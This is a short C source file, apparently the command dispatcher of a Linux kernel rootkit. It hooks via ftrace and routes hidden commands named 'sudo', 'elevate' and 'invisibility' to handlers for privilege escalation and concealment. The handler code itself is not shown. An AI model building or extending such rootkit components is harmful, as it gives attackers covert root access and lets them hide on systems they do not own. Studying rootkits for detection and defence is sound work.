// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

#include "../../utils/ftrace/ftrace_helper.h"
#include "../../logger/logger.h"
#include "parser/parser.h"

#include "dispatcher.h"

// ////////////////////////////////////////////////////////////////////

#include "commands/elevate/elevate.h"
#include "commands/version/version.h"
#include "commands/sudo/sudo.h"
#include "commands/invisibility/invisibility.h"

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

void dispatcher(const struct pt_regs *regs, const char *command) {
    rk_info("[dispatcher] dispatching command %s\n", command);

    char *action = NULL;
    char **argv = NULL;
    int argc = 0;

    if (parse_command(command, &action, &argv, &argc) == 0) {
        rk_info("[dispatcher] action: %s with %d args\n", action, argc);

        for (int i = 0; i < argc; i++) {
            rk_info("[dispatcher] argv[%d]: %s\n", i, argv[i]);
        }

        if (strcmp(action, "sudo") == 0)                sudo(regs, argv, argc);
        else if (strcmp(action, "version") == 0)        version(regs, argv, argc);
        else if (strcmp(action, "elevate") == 0)        elevate(regs, argv, argc);
        else if (strcmp(action, "invisibility") == 0)   invisibility(regs, argv, argc);


        free_parsed_command(action, argv, argc);
    }
}

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////
